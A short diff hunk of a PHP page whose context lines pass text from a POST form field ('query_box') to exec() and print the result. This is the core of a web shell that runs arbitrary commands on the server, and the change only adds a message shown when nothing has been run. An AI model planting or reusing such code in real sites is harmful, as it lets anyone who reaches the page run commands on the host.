@@ -26,6 +26,8 @@ if (!empty($_POST['query_box'])) {
 	$run = exec("$shell");
 	echo "<br><b>Output: </b><br>";
 	echo "<pre>$run</pre>";
+}else{
+	echo "Nothing has been run yet.";	
 }
 ?>  
 </body>
